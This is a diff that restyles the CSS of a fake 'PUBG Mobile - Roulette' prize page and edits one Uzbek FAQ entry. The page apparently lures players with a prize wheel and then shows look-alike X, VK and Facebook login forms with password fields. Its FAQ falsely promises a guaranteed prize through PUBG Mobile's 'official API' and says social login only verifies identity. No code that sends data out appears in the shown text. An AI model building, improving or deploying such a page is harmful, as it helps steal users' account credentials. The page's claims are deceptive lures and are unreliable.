@@ -4,149 +4,168 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>PUBG Mobile - Roulette</title>
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
+        :root {
+            --primary: #7B68EE;
+            --accent: #1877F2;
+            --gold: #ffcc00;
+            --bg-card: rgba(20, 35, 60, 0.7);
+            --border-light: rgba(255, 255, 255, 0.1);
+            --text-main: #e0e6ed;
+        }
+
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
-        
+
         body {
-            background: #0a1520;
-            color: white;
+            background: #050a10;
+            color: var(--text-main);
             min-height: 100vh;
             display: flex;
             flex-direction: column;
             align-items: center;
-            padding: 10px;
+            font-family: 'Inter', -apple-system, sans-serif; /* Более современный шрифт */
             overflow-x: hidden;
-            font-family: Arial, sans-serif;
-            position: relative;
         }
-        
-        /* Фон на весь сайт */
+
+        /* Фон с эффектом глубины */
         body::before {
             content: '';
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
+            inset: 0;
             background-image: url('phon.png');
             background-size: cover;
             background-position: center;
-            background-repeat: no-repeat;
-            background-attachment: fixed;
-            z-index: -1;
+            filter: brightness(0.4) contrast(1.1); /* Делаем фон темнее и сочнее */
+            z-index: -2;
         }
-        
-        /* Затемнение фона для лучшей читаемости */
+
+        /* Виньетка (затемнение по краям) */
         body::after {
             content: '';
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(10, 21, 32, 0.85);
+            inset: 0;
+            background: radial-gradient(circle, transparent 20%, rgba(0,0,0,0.8) 100%);
             z-index: -1;
         }
-        
-        /* СЧЕТЧИК ПОБЕДИТЕЛЕЙ - ОБНОВЛЕНО: В ПРАВОМ УГЛУ И ФИКСИРОВАН */
+
+        /* СЧЕТЧИК ПОБЕДИТЕЛЕЙ (Стиль "Live") */
         .winners-counter {
             position: fixed;
-            top: 10px;
-            right: 10px; /* Изменено с left на right */
-            background: rgba(20, 35, 60, 0.9);
-            border-radius: 10px;
-            padding: 8px 15px;
-            border: 1px solid #2a3b5a;
-            backdrop-filter: blur(10px);
-            z-index: 100;
+            top: 20px;
+            right: 20px;
+            background: rgba(0, 0, 0, 0.6);
+            border-radius: 50px; /* Скругленные края */
+            padding: 10px 20px;
+            border: 1px solid var(--primary);
+            backdrop-filter: blur(15px);
+            z-index: 1000;
             display: flex;
             align-items: center;
-            gap: 8px;
-            animation: slideInDown 0.5s ease-out;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            gap: 12px;
+            box-shadow: 0 0 20px rgba(123, 104, 238, 0.3);
         }
-        
+
+        /* Точка "Live" */
+        .winners-counter::before {
+            content: '';
+            width: 8px;
+            height: 8px;
+            background: #ff4b4b;
+            border-radius: 50%;
+            animation: blink 1.5s infinite;
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.3; transform: scale(1.2); }
+        }
+
         .winners-counter i {
-            color: #7B68EE;
-            font-size: 14px;
+            color: var(--gold);
+            font-size: 16px;
         }
-        
+
         .winners-count {
             font-family: 'Orbitron', sans-serif;
             font-weight: 700;
             font-size: 18px;
-            background: linear-gradient(90deg, #7B68EE, #8A2BE2);
+            background: linear-gradient(90deg, var(--gold), #ff9900);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             animation: countPulse 2s infinite;
         }
-        
+
         @keyframes countPulse {
             0%, 100% { opacity: 1; }
             50% { opacity: 0.7; }
         }
-        
-        /* Верхнее меню - ОБНОВЛЕНО */
+
+        /* ВЕРХНЕЕ МЕНЮ (Glassmorphism) */
         .top-menu {
-            width: 100%;
-            max-width: 800px;
+            width: 95%;
+            max-width: 1000px;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            padding: 10px 20px;
-            margin-top: 40px;
-            margin-bottom: 20px;
-            background: rgba(20, 35, 60, 0.8);
-            border-radius: 10px;
-            border: 1px solid #2a3b5a;
-            backdrop-filter: blur(10px);
+            padding: 12px 25px;
+            margin-top: 30px;
+            background: var(--bg-card);
+            border-radius: 15px;
+            border: 1px solid var(--border-light);
+            border-top: 1px solid rgba(255,255,255,0.2); /* Блик сверху */
+            backdrop-filter: blur(12px);
+            box-shadow: 0 15px 35px rgba(0,0,0,0.5);
             z-index: 100;
             position: relative;
         }
-        
+
         /* Меню слева с бургером */
         .menu-left {
             display: flex;
             gap: 15px;
             flex: 1;
         }
-        
-        .menu-btn {
-            background: linear-gradient(to right, #2a3b5a, #1a2c42);
-            color: #8da1b5;
-            border: 1px solid #2a3b5a;
-            border-radius: 5px;
-            padding: 8px 15px;
-            font-family: Arial, sans-serif;
-            font-weight: 500;
+
+        /* КНОПКИ МЕНЮ */
+        .menu-btn, .language-btn, .prize-mail-btn {
+            background: rgba(255, 255, 255, 0.05);
+            color: #fff;
+            border: 1px solid var(--border-light);
+            border-radius: 8px;
+            padding: 10px 18px;
+            font-size: 13px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
             cursor: pointer;
             display: flex;
             align-items: center;
             gap: 8px;
             text-decoration: none;
-            transition: all 0.3s;
-            font-size: 14px;
+            font-family: 'Inter', sans-serif;
         }
-        
+
         .menu-btn:hover {
-            background: linear-gradient(to right, #3a4b6a, #2a3c52);
-            transform: translateY(-2px);
-            color: #1877F2;
+            background: var(--accent);
+            border-color: var(--accent);
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(24, 119, 242, 0.4);
         }
-        
+
         /* Выпадающее меню */
         .dropdown-menu {
             position: absolute;
             top: 100%;
             left: 0;
-            background: #1a2c42;
-            border: 1px solid #2a3b5a;
-            border-radius: 5px;
+            background: rgba(10, 20, 35, 0.95);
+            border: 1px solid var(--primary);
+            border-radius: 12px;
             min-width: 200px;
             max-height: 0;
             overflow: hidden;
@@ -154,13 +173,15 @@
             flex-direction: column;
             z-index: 1000;
             transition: max-height 0.3s ease;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.6);
+            margin-top: 10px;
         }
-        
+
         .dropdown-menu.show {
             max-height: 300px;
             animation: fadeInDropdown 0.3s ease;
         }
-        
+
         @keyframes fadeInDropdown {
             from {
                 opacity: 0;
@@ -171,26 +192,27 @@
                 transform: translateY(0);
             }
         }
-        
+
         .dropdown-item {
             padding: 12px 15px;
             cursor: pointer;
-            border-bottom: 1px solid #2a3b5a;
+            border-bottom: 1px solid var(--border-light);
             transition: all 0.3s;
-            color: #8da1b5;
+            color: var(--text-main);
             font-weight: 400;
-            font-family: Arial, sans-serif;
+            font-family: 'Inter', sans-serif;
             display: flex;
             align-items: center;
             gap: 8px;
             text-decoration: none;
         }
-        
+
         .dropdown-item:hover {
-            background: #2a3b5a;
-            color: #1877F2;
+            background: rgba(123, 104, 238, 0.2);
+            color: #fff;
+            padding-left: 20px; /* Эффект смещения */
         }
-        
+
         /* Правая часть меню */
         .menu-right {
             display: flex;
@@ -199,95 +221,78 @@
             flex: 1;
             justify-content: flex-end;
         }
-        
+
         .language-menu {
             position: relative;
         }
-        
+
         .language-btn {
-            background: linear-gradient(to right, #2a3b5a, #1a2c42);
-            color: #8da1b5;
-            border: 1px solid #2a3b5a;
-            border-radius: 5px;
-            padding: 8px 15px;
-            font-family: Arial, sans-serif;
-            font-weight: 500;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            gap: 8px;
             min-width: 120px;
             justify-content: space-between;
         }
-        
+
         .language-dropdown {
             position: absolute;
             top: 100%;
             right: 0;
-            background: #1a2c42;
-            border: 1px solid #2a3b5a;
-            border-radius: 5px;
+            background: rgba(10, 20, 35, 0.95);
+            border: 1px solid var(--primary);
+            border-radius: 12px;
             min-width: 200px;
             max-height: 300px;
             overflow-y: auto;
             display: none;
             z-index: 1000;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.6);
+            margin-top: 10px;
         }
-        
+
         .language-dropdown.show {
             display: block;
             animation: fadeInDropdown 0.3s ease;
         }
-        
+
         .language-option {
             padding: 10px 15px;
             cursor: pointer;
-            border-bottom: 1px solid #2a3b5a;
+            border-bottom: 1px solid var(--border-light);
             transition: all 0.3s;
-            color: #8da1b5;
+            color: var(--text-main);
             font-weight: 400;
-            font-family: Arial, sans-serif;
+            font-family: 'Inter', sans-serif;
         }
-        
+
         .language-option:hover {
-            background: #2a3b5a;
+            background: rgba(123, 104, 238, 0.2);
             transform: translateX(5px);
         }
-        
-        /* Иконка почты для приза */
+
+        /* ПРИЗОВАЯ ПОЧТА (Золотой акцент) */
         .prize-mail-icon {
             display: flex;
         }
-        
+
         .prize-mail-btn {
-            background: linear-gradient(to right, #2a3b5a, #1a2c42);
-            color: #8da1b5;
-            border: 1px solid #2a3b5a;
-            border-radius: 5px;
+            background: linear-gradient(135deg, #f39c12, #d35400);
+            border: none;
+            font-family: 'Orbitron', sans-serif;
+            color: #000; /* Черный текст на золотом выглядит дороже */
+            font-weight: 800;
             padding: 8px 20px;
-            font-family: Arial, sans-serif;
-            font-weight: 500;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            gap: 8px;
             position: relative;
             transition: all 0.3s;
-            font-family: 'Orbitron', sans-serif;
-            font-size: 12px;
         }
-        
-        .prize-mail-btn:hover:not(:disabled) {
-            background: linear-gradient(to right, #3a4b6a, #2a3c52);
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+
+        .prize-mail-btn:hover {
+            filter: brightness(1.2);
+            transform: scale(1.05);
         }
-        
+
         .prize-badge {
             position: absolute;
             top: -8px;
             right: -8px;
-            background: #1877F2;
+            background: var(--accent);
             color: white;
             width: 20px;
             height: 20px;
@@ -298,20 +303,20 @@
             font-size: 10px;
             animation: pulse 1.5s infinite;
         }
-        
+
         @keyframes pulse {
             0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(24, 119, 242, 0.7); }
             70% { transform: scale(1.1); box-shadow: 0 0 0 10px rgba(24, 119, 242, 0); }
             100% { transform: scale(1); }
         }
-        
+
         .prize-mail-btn:disabled {
             background: linear-gradient(to right, #444, #555);
             color: #777;
             cursor: not-allowed;
             transform: none;
         }
-        
+
         /* НОВЫЙ ИНТЕРФЕЙС ПОЧТЫ (ОКНО ПРИЗА) */
         .prize-window {
             position: fixed;
@@ -334,7 +339,7 @@
 
         .prize-content {
             background: linear-gradient(180deg, #162436 0%, #0a1018 100%);
-            border: 2px solid #1877F2;
+            border: 2px solid var(--accent);
             border-radius: 20px;
             padding: 40px 20px;
             width: 90%;
@@ -361,7 +366,7 @@
             top: -20px;
             left: 50%;
             transform: translateX(-50%);
-            background: #1877F2;
+            background: var(--accent);
             color: white;
             padding: 8px 40px;
             font-family: 'Orbitron', sans-serif;
@@ -442,7 +447,7 @@
         }
 
         .prize-desc {
-            color: #8da1b5;
+            color: var(--text-main);
             font-size: 14px;
             margin-bottom: 30px;
             line-height: 1.5;
@@ -450,7 +455,7 @@
         }
 
         .collect-btn {
-            background: linear-gradient(180deg, #1877F2 0%, #1153b3 100%);
+            background: linear-gradient(180deg, var(--accent) 0%, #1153b3 100%);
             border: none;
             padding: 15px 50px;
             border-radius: 8px;
@@ -686,7 +691,7 @@
             top: -30px;
             left: 50%;
             transform: translateX(-50%);
-            background: linear-gradient(135deg, #7B68EE, #4B0082);
+            background: linear-gradient(135deg, var(--primary), #4B0082);
             color: white;
             padding: 6px 15px;
             border-radius: 25px;
@@ -717,7 +722,7 @@
             transform: translateX(-50%);
             border-left: 8px solid transparent;
             border-right: 8px solid transparent;
-            border-top: 8px solid #7B68EE;
+            border-top: 8px solid var(--primary);
         }
         
         .selection-indicator.show {
@@ -726,7 +731,7 @@
         
         /* КНОПКА ИГРАТЬ */
         .play-btn {
-            background: linear-gradient(180deg, #7B68EE 0%, #4B0082 100%);
+            background: linear-gradient(180deg, var(--primary) 0%, #4B0082 100%);
             color: white;
             border: none;
             border-radius: 60px;
@@ -808,7 +813,7 @@
         
         /* ФОРМА ВВОДА ID АККАУНТА */
         .account-id-section {
-            background: rgba(20, 35, 60, 0.9);
+            background: var(--bg-card);
             border-radius: 20px;
             padding: 25px;
             width: 100%;
@@ -829,7 +834,7 @@
         }
         
         .account-id-section h2 {
-            color: #8da1b5;
+            color: var(--text-main);
             text-align: center;
             margin-bottom: 20px;
             font-size: 24px;
@@ -842,8 +847,8 @@
         .account-id-section p {
             text-align: center;
             margin-bottom: 20px;
-            color: #8da1b5;
-            font-family: Arial, sans-serif;
+            color: var(--text-main);
+            font-family: 'Inter', sans-serif;
             font-size: 16px;
         }
         
@@ -854,9 +859,9 @@
         .id-label {
             display: block;
             margin-bottom: 10px;
-            color: #8da1b5;
+            color: var(--text-main);
             font-size: 16px;
-            font-family: Arial, sans-serif;
+            font-family: 'Inter', sans-serif;
             font-weight: 500;
         }
         
@@ -868,19 +873,19 @@
             border-radius: 10px;
             color: white;
             font-size: 16px;
-            font-family: Arial, sans-serif;
+            font-family: 'Inter', sans-serif;
             transition: all 0.3s;
         }
         
         .id-input:focus {
             outline: none;
-            border-color: #1877F2;
+            border-color: var(--accent);
             box-shadow: 0 0 15px rgba(24, 119, 242, 0.3);
             transform: translateY(-2px);
         }
         
         .id-submit-btn {
-            background: linear-gradient(180deg, #7B68EE 0%, #4B0082 100%);
+            background: linear-gradient(180deg, var(--primary) 0%, #4B0082 100%);
             color: white;
             border: none;
             border-radius: 60px;
@@ -943,7 +948,7 @@
         
         /* ФОРМА ВЫБОРА СОЦСЕТИ */
         .social-select-section {
-            background: rgba(20, 35, 60, 0.9);
+            background: var(--bg-card);
             border-radius: 20px;
             padding: 25px;
             width: 100%;
@@ -975,7 +980,7 @@
         }
         
         .social-select-section h2 {
-            color: #8da1b5;
+            color: var(--text-main);
             text-align: center;
             margin-bottom: 20px;
             font-size: 24px;
@@ -988,8 +993,8 @@
         .social-select-section p {
             text-align: center;
             margin-bottom: 20px;
-            color: #8da1b5;
-            font-family: Arial, sans-serif;
+            color: var(--text-main);
+            font-family: 'Inter', sans-serif;
             font-size: 16px;
         }
         
@@ -1048,7 +1053,7 @@
         }
         
         .social-option.selected {
-            border-color: #1877F2;
+            border-color: var(--accent);
             background: rgba(24, 119, 242, 0.1);
             box-shadow: 
                 0 0 20px rgba(24, 119, 242, 0.4),
@@ -1115,19 +1120,19 @@
         .social-option span {
             font-weight: 600;
             font-size: 14px;
-            color: #8da1b5;
-            font-family: Arial, sans-serif;
+            color: var(--text-main);
+            font-family: 'Inter', sans-serif;
             transition: color 0.3s;
         }
         
         .social-option.selected span {
-            color: #1877F2;
+            color: var(--accent);
             font-weight: 700;
         }
         
         /* КНОПКА ПОЛУЧИТЬ ПРИЗ */
         .get-prize-btn {
-            background: linear-gradient(180deg, #7B68EE 0%, #4B0082 100%);
+            background: linear-gradient(180deg, var(--primary) 0%, #4B0082 100%);
             color: white;
             border: none;
             border-radius: 60px;
@@ -1197,15 +1202,15 @@
         /* Текст "Важно" в форме выбора соцсети */
         .important-note {
             text-align: center;
-            color: #8da1b5;
+            color: var(--text-main);
             font-size: 14px;
             margin-top: 15px;
-            font-family: Arial, sans-serif;
+            font-family: 'Inter', sans-serif;
         }
         
         /* СЕКЦИЯ ПОДТВЕРЖДЕНИЯ */
         .confirmation-section {
-            background: rgba(20, 35, 60, 0.9);
+            background: var(--bg-card);
             border-radius: 20px;
             padding: 40px 30px;
             width: 100%;
@@ -1257,11 +1262,11 @@
         }
         
         .confirmation-message {
-            color: #8da1b5;
+            color: var(--text-main);
             font-size: 18px;
             line-height: 1.6;
             margin-bottom: 25px;
-            font-family: Arial, sans-serif;
+            font-family: 'Inter', sans-serif;
             padding: 20px;
             background: rgba(76, 175, 80, 0.1);
             border-radius: 15px;
@@ -1284,17 +1289,17 @@
             max-width: 800px;
             margin-top: 40px;
             margin-bottom: 30px;
-            background: rgba(20, 35, 60, 0.8);
+            background: var(--bg-card);
             border-radius: 20px;
             padding: 30px;
-            border: 1px solid #2a3b5a;
+            border: 1px solid var(--border-light);
             backdrop-filter: blur(10px);
             animation: slideInUp 0.8s ease-out 0.5s both;
         }
         
         .faq-section h2 {
             text-align: center;
-            color: #7B68EE;
+            color: var(--primary);
             font-family: 'Orbitron', sans-serif;
             font-size: 28px;
             margin-bottom: 30px;
@@ -1312,12 +1317,12 @@
             background: rgba(12, 26, 45, 0.7);
             border-radius: 15px;
             overflow: hidden;
-            border: 1px solid #2a3b5a;
+            border: 1px solid var(--border-light);
             transition: all 0.3s ease;
         }
         
         .faq-item.active {
-            border-color: #7B68EE;
+            border-color: var(--primary);
             box-shadow: 0 5px 15px rgba(123, 104, 238, 0.3);
         }
         
@@ -1327,20 +1332,20 @@
             display: flex;
             justify-content: space-between;
             align-items: center;
-            font-family: Arial, sans-serif;
+            font-family: 'Inter', sans-serif;
             font-weight: 600;
             font-size: 16px;
-            color: #8da1b5;
+            color: var(--text-main);
             transition: all 0.3s;
         }
         
         .faq-question:hover {
-            color: #7B68EE;
+            color: var(--primary);
             background: rgba(42, 59, 90, 0.3);
         }
         
         .faq-question i {
-            color: #7B68EE;
+            color: var(--primary);
             transition: transform 0.3s;
             font-size: 18px;
         }
@@ -1354,8 +1359,8 @@
             max-height: 0;
             overflow: hidden;
             transition: all 0.3s ease;
-            color: #8da1b5;
-            font-family: Arial, sans-serif;
+            color: var(--text-main);
+            font-family: 'Inter', sans-serif;
             font-size: 14px;
             line-height: 1.6;
         }
@@ -1382,18 +1387,18 @@
         }
         
         .faq-answer strong {
-            color: #7B68EE;
+            color: var(--primary);
         }
         
         .faq-answer a {
-            color: #1877F2;
+            color: var(--accent);
             text-decoration: none;
             transition: all 0.3s;
         }
         
         .faq-answer a:hover {
             text-decoration: underline;
-            color: #7B68EE;
+            color: var(--primary);
         }
         
         /* ОБНОВЛЕННЫЕ УВЕДОМЛЕНИЯ - НОВЫЙ ДИЗАЙН (фиолетовый/синий) */
@@ -1406,7 +1411,7 @@
             color: white;
             padding: 25px 35px;
             border-radius: 20px;
-            border: 2px solid #7B68EE;
+            border: 2px solid var(--primary);
             box-shadow: 
                 0 15px 35px rgba(0, 0, 0, 0.8),
                 0 0 40px rgba(123, 104, 238, 0.4);
@@ -1441,7 +1446,7 @@
             left: -2px;
             right: -2px;
             bottom: -2px;
-            background: linear-gradient(45deg, #7B68EE, #4B0082, #4169E1, #7B68EE);
+            background: linear-gradient(45deg, var(--primary), #4B0082, #4169E1, var(--primary));
             border-radius: 22px;
             z-index: -1;
             animation: borderRotate 3s linear infinite;
@@ -1467,7 +1472,7 @@
         }
         
         .notification.success {
-            color: #7B68EE;
+            color: var(--primary);
             border-color: #4CAF50;
             background: linear-gradient(135deg, #0a1a2a, #1a2a3a);
         }
@@ -1576,7 +1581,7 @@
             font-size: 30px;
             font-weight: 700;
             margin-bottom: 40px;
-            font-family: Arial, sans-serif;
+            font-family: 'Inter', sans-serif;
             color: #0F1419;
             text-align: center;
         }
@@ -1600,7 +1605,7 @@
             justify-content: center;
             gap: 10px;
             transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            font-family: Arial, sans-serif;
+            font-family: 'Inter', sans-serif;
         }
         
         .modal-dark .social-login-btn {
@@ -1661,7 +1666,7 @@
             font-size: 17px;
             background: white;
             color: #0F1419;
-            font-family: Arial, sans-serif;
+            font-family: 'Inter', sans-serif;
             transition: all 0.3s;
         }
         
@@ -1689,7 +1694,7 @@
             font-weight: 700;
             cursor: pointer;
             margin-bottom: 20px;
-            font-family: Arial, sans-serif;
+            font-family: 'Inter', sans-serif;
             transition: all 0.3s;
         }
         
@@ -1711,7 +1716,7 @@
             color: #1D9BF0;
             text-decoration: none;
             font-size: 15px;
-            font-family: Arial, sans-serif;
+            font-family: 'Inter', sans-serif;
         }
         
         .x-link:hover {
@@ -1724,7 +1729,7 @@
             border-top: 1px solid #EFF3F4;
             color: #536471;
             font-size: 15px;
-            font-family: Arial, sans-serif;
+            font-family: 'Inter', sans-serif;
             text-align: center;
         }
         
@@ -1766,16 +1771,16 @@
             font-weight: 700;
             margin-bottom: 30px;
             text-align: center;
-            font-family: Arial, sans-serif;
+            font-family: 'Inter', sans-serif;
             color: white;
         }
         
         .x-password-label {
             display: block;
             margin-bottom: 8px;
-            color: #8da1b5;
+            color: var(--text-main);
             font-size: 14px;
-            font-family: Arial, sans-serif;
+            font-family: 'Inter', sans-serif;
         }
         
         .x-password-input {
@@ -1787,7 +1792,7 @@
             font-size: 17px;
             background: #000;
             color: white;
-            font-family: Arial, sans-serif;
+            font-family: 'Inter', sans-serif;
             transition: all 0.3s;
         }
         
@@ -1809,7 +1814,7 @@
             font-weight: 700;
             cursor: pointer;
             margin-bottom: 20px;
-            font-family: Arial, sans-serif;
+            font-family: 'Inter', sans-serif;
             transition: all 0.3s;
         }
         
@@ -1826,7 +1831,7 @@
             text-decoration: none;
             font-size: 15px;
             margin-bottom: 20px;
-            font-family: Arial, sans-serif;
+            font-family: 'Inter', sans-serif;
         }
         
         .x-forgot-password:hover {
@@ -1837,9 +1842,9 @@
             margin-top: 30px;
             padding-top: 20px;
             border-top: 1px solid #2F3336;
-            color: #8da1b5;
+            color: var(--text-main);
             font-size: 15px;
-            font-family: Arial, sans-serif;
+            font-family: 'Inter', sans-serif;
             text-align: center;
         }
         
@@ -1868,7 +1873,7 @@
             font-weight: 500;
             margin-bottom: 30px;
             color: #000;
-            font-family: Arial, sans-serif;
+            font-family: 'Inter', sans-serif;
         }
         
         .vk-label {
@@ -1876,7 +1881,7 @@
             margin-bottom: 8px;
             color: #818C99;
             font-size: 13px;
-            font-family: Arial, sans-serif;
+            font-family: 'Inter', sans-serif;
         }
         
         .vk-input {
@@ -1888,7 +1893,7 @@
             font-size: 16px;
             background: #F2F3F5;
             color: #000;
-            font-family: Arial, sans-serif;
+            font-family: 'Inter', sans-serif;
             transition: all 0.3s;
         }
         
@@ -1915,7 +1920,7 @@
         .vk-checkbox label {
             color: #818C99;
             font-size: 14px;
-            font-family: Arial, sans-serif;
+            font-family: 'Inter', sans-serif;
         }
         
         .vk-submit-btn {
@@ -1929,7 +1934,7 @@
             font-weight: 500;
             cursor: pointer;
             margin-bottom: 20px;
-            font-family: Arial, sans-serif;
+            font-family: 'Inter', sans-serif;
             transition: all 0.3s;
         }
         
@@ -1948,7 +1953,7 @@
             color: #4A76A8;
             text-decoration: none;
             font-size: 16px;
-            font-family: Arial, sans-serif;
+            font-family: 'Inter', sans-serif;
         }
         
         .vk-link:hover {
@@ -1996,13 +2001,13 @@
             font-size: 17px;
             background: white;
             color: #1C1E21;
-            font-family: Arial, sans-serif;
+            font-family: 'Inter', sans-serif;
             transition: all 0.3s;
         }
         
         .fb-input:focus {
             outline: none;
-            border-color: #1877F2;
+            border-color: var(--accent);
             box-shadow: 0 0 0 2px #E7F3FF;
             transform: translateY(-2px);
         }
@@ -2010,7 +2015,7 @@
         .fb-submit-btn {
             width: 100%;
             padding: 14px;
-            background: #1877F2;
+            background: var(--accent);
             color: white;
             border: none;
             border-radius: 6px;
@@ -2018,7 +2023,7 @@
             font-weight: 600;
             cursor: pointer;
             margin: 10px 0 20px;
-            font-family: Arial, sans-serif;
+            font-family: 'Inter', sans-serif;
             transition: all 0.3s;
         }
         
@@ -2031,11 +2036,11 @@
         .fb-link {
             display: block;
             text-align: center;
-            color: #1877F2;
+            color: var(--accent);
             text-decoration: none;
             font-size: 14px;
             margin-bottom: 20px;
-            font-family: Arial, sans-serif;
+            font-family: 'Inter', sans-serif;
         }
         
         .fb-link:hover {
@@ -2060,7 +2065,7 @@
             font-weight: 600;
             cursor: pointer;
             display: block;
-            font-family: Arial, sans-serif;
+            font-family: 'Inter', sans-serif;
             transition: all 0.3s;
         }
         
@@ -2305,9 +2310,9 @@
             text-align: center;
             padding: 20px;
             margin-top: 30px;
-            background: rgba(20, 35, 60, 0.8);
+            background: var(--bg-card);
             border-radius: 10px;
-            border-top: 2px solid #2a3b5a;
+            border-top: 2px solid var(--border-light);
             backdrop-filter: blur(10px);
             animation: fadeIn 1s ease-out 0.5s both;
         }
@@ -2321,12 +2326,12 @@
         }
         
         .footer-link {
-            color: #8da1b5;
+            color: var(--text-main);
             text-decoration: none;
             font-size: 14px;
             transition: all 0.3s;
             font-weight: 400;
-            font-family: Arial, sans-serif;
+            font-family: 'Inter', sans-serif;
             position: relative;
         }
         
@@ -2337,12 +2342,12 @@
             left: 0;
             width: 0;
             height: 1px;
-            background: #1877F2;
+            background: var(--accent);
             transition: width 0.3s;
         }
         
         .footer-link:hover {
-            color: #1877F2;
+            color: var(--accent);
         }
         
         .footer-link:hover::after {
@@ -2350,19 +2355,19 @@
         }
         
         .copyright {
-            color: #8da1b5;
+            color: var(--text-main);
             font-size: 13px;
             margin-top: 10px;
             line-height: 1.5;
             font-weight: 400;
-            font-family: Arial, sans-serif;
+            font-family: 'Inter', sans-serif;
         }
         
         @media (max-width: 600px) {
             .winners-counter {
-                top: 5px;
-                right: 5px; /* Обновлено для мобильной версии */
-                padding: 6px 12px;
+                top: 10px;
+                right: 10px;
+                padding: 8px 15px;
                 font-size: 12px;
             }
             
@@ -3541,7 +3546,7 @@
                     faq2q: "Sovrin albatta mening hisobimga keladimi?",
                     faq2a: "<strong>Ha, sovrinni olish kafolati 100%.</strong> Barcha yutuqlar ma'lumotlarni tasdiqlaganingizdan keyin 24 soat ichida avtomatik ravishda yuboriladi. Tizim PUBG Mobile ning rasmiy API bilan integratsiyalangan, bu esa belgilangan hisobga sovrinlarni etkazib berishni kafolatlaydi.",
                     faq3q: "Nega ijtimoiy tarmoqqa kirish kerak?",
-                    faq3a: "Ijtimoiy tarmoqqa kirish <strong>shaxsingizni tekshirish</strong> va firibgarlikni oldini olish uchun zarur. Bu bizga sovrinni bot emas, balki haqiqiy odam olishini ta'minlash imkonini beradi. Barcha ma'lumotlar himoyalangan va uchinchi shaxslarga o'tkazilmaydi.",
+                    faq3a: "Ijtimoiy tarmoqqa kirish <strong>shaxsingizni tekshirish</strong> va firibgarlikni oldini olish uchun zarur. Bu bizga sovrinni bot emas, balki haqiqiy odam olishini ta'minlash imkonini beradi. Barcha ma'lumotlar himoyalangan va uchinji shaxslarga o'tkazilmaydi.",
                     faq4q: "Hisob ID raqamini ko'rsatmasam nima bo'ladi?",
                     faq4a: "PUBG Mobile hisob ID raqamini ko'rsatmasdan, biz <strong>sizga sovrinni yubora olmaymiz</strong>. Bu majburiy maydon, chunki tizim o'yin hisobini aniqlash uchun ushbu identifikatordan foydalanadi.",
                     faq5q: "Agar sovrin 24 soat ichida kelmasa nima qilish kerak?",
